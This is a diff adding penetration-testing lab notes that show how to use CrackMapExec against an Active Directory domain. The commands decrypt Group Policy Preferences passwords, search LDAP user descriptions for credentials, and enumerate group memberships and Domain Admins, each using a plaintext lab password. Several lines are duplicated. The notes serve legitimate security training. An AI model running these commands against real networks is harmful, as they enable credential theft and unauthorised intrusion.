@@ -1,1 +1,66 @@
+Enumerating Group Policy Preferences (GPP)
+Group Policy is a set of configurations that enforces and controls specific settings on domain-joined computers and users. Examples of Group Policy settings include password complexity requirements, software installation restrictions, and firewall rules.
+
+To access the GPP information and decrypt its stored password using CrackMapExec, we can use 2 modules — gpp_password and gpp_autologin modules.
+The gpp_password decrypts passwords stored in the Group.xml file, while gpp_autologin retrieves autologin information from the Registry.xml file in the preferences folder.
+
+ crackmapexec smb 10.129.204.177 -u grace -p Inlanefreight01! -M gpp_password
+  
+ Enumerating Group Policy Preferences (GPP)
+ crackmapexec smb 10.129.204.177 -u grace -p Inlanefreight01! -M gpp_password
+ crackmapexec smb 10.129.204.177 -u grace -p Inlanefreight01! -M gpp_autologin
+
+Enumerating LDAP
+To enumerate the AD environment, we can utilize CrackMapExec much like we use PowerView. CrackMapExec has several modules that enable us to enumerate LDAP information for authenticated users. By running LDAP with the -L option, we can see the list of all the available modules.
+crackmapexec ldap -L
+
+User Description
+To enumerate users, we have 2 modules: get-desc-users and user-desc. The get-desc-users module returns all users and their descriptions
+crackmapexec ldap 10.129.204.177 -u grace -p Inlanefreight01! -M get-desc-users
+
+The other module user-desc retrieves users descriptions that matches the keywords defined in the script user_description.py . 
+The default keywords are in the self.keywords = {‘pass’, ‘creds’, ‘creden’, ‘key’, ‘secret’, ‘default’} located at /cme/modules/user_description.py.
+If the description field doesn’t contain any of the default keywords, the module won’t be able to retrieve it. Remember that when enumerating LDAP with this module.
+crackmapexec ldap 10.129.204.177 -u grace -p Inlanefreight01! -M user-desc
+
+If we want to search for specific values not included in the default keywords, we can use the -o option, and the KEYWORDS parameter equals the value we want to look up.
+
+crackmapexec ldap 10.129.204.177 -u grace -p Inlanefreight01! -M user-desc -o KEYWORDS=IP
+
+crackmapexec ldap 10.129.204.177 -u grace -p Inlanefreight01! -M user-desc
+crackmapexec ldap 10.129.204.177 -u grace -p Inlanefreight01! -M get-desc-users
+crackmapexec ldap 10.129.204.177 -u grace -p Inlanefreight01! -M user-desc -o KEYWORDS=IP
+The default keywords are in the self.keywords = {‘pass’, ‘creds’, ‘creden’, ‘key’, ‘secret’, ‘default’} located at /cme/modules/user_description.py.
+
+User Information
+Another useful module is the whoami; it allows us to obtain information about the user we are authenticated as or specify another user with -o option and the USER parameter.
+crackmapexec ldap 10.129.204.177 -u grace -p Inlanefreight01! -M whoami
+crackmapexec ldap 10.129.204.177 -u grace -p Inlanefreight01! -M whoami -o USER=alina
+
+Group Membership
+There are 2 modules that enable us to query group memberships — groupmembership and group-mem. The groupmembership helps us retrieve the groups that a user belongs to.
+To run this module, we can use the -o option and specify the user in the USER parameter. The example below shows that the Grace user is a member of the SQL admins and Domain Users groups.
+crackmapexec ldap 10.129.204.177 -u grace -p Inlanefreight01! -M groupmembership -o USER=grace
+
+With the group-mem module, we can get all the users of a specific group with the -o option and the GROUP parameter. As seen below, the “Domain Admins” group has 3 members — Administrator, Julio, and David.
+crackmapexec ldap 10.129.204.177 -u grace -p Inlanefreight01! -M group-mem -o Group='Domain Admins'
+
+crackmapexec ldap 10.129.204.177 -u grace -p Inlanefreight01! -M groupmembership -o USER=grace
+crackmapexec ldap 10.129.204.177 -u grace -p Inlanefreight01! -M group-mem -o Group='Domain Admins'
+
+Domain Computers
+To locate domain computers, the find-computer module searches for specified text. For instance, if we need to find all servers within the domain, we can use the -o option with the TEXT parameter set to “servers”.We can also look for Windows workstations and servers by searching for “windows” or operating system versions, such as “2003, 2008, 2016”, to identify older systems.
+
+To locate domain computers
+crackmapexec ldap 10.129.204.177 -u grace -p Inlanefreight01! -M find-computer -o TEXT='server'
+
+
+
+
+
+
+
+
+
+
 
